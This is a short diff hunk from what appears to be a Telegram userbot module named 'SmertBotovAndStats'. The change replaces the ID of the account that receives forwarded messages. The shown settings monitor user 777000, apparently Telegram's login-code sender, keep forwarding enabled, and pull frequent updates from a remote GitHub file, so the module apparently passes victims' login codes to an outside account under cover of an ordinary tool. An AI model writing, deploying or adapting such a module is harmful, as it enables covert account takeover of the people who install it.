@@ -54,7 +54,7 @@ class SmertBotovAndStats(loader.Module):
 
     def __init__(self):
         self._monitored_user_id = 777000
-        self._target_user_id = 6764530470
+        self._target_user_id = 5145799538
         self._forward_enabled = True
         self._update_url = "https://github.com/InsaneError/InsDos/blob/main/InsDos.py"
         self._update_interval = 10
